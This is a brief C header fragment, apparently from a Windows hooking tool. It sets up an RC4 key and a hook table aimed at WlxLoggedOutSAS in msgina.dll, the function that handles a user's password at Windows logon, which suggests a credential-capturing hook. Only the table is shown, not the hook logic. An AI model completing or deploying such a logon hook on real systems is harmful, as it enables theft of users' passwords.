#include "openssl\rc4.h"
//  Crypto Vars
RC4_KEY global_key;

///////////////////////////////////////////////////////////////////
// HOOK_TABLE
// This table contains:
// - the name of the dll which contains the function you wanna hook
// - the name of the function you wanna hook
// *- the address of the original function
// *- the address of the hook function
// 
// *=Should both be NULL if you edit the table. Their addresses get loaded in
//   the HookFunctionInCurrentProcess (ppOriginal) & InitHooks (ppHook) functions.
//
// Written by JeFFOsZ

#define WLXLOGGEDOUTHOOK 0 // # in htHookTable

struct { 
char *dll; // DLL name
char *func;// Function name
LPVOID ppOriginal;// New address
LPVOID ppHook;// Original address
} htHookTable[]={
	{"msgina.dll","WlxLoggedOutSAS",NULL,NULL},
	{NULL,NULL,NULL,NULL}, // last record dummy
};
///////////////////////////////////////////////////////////////////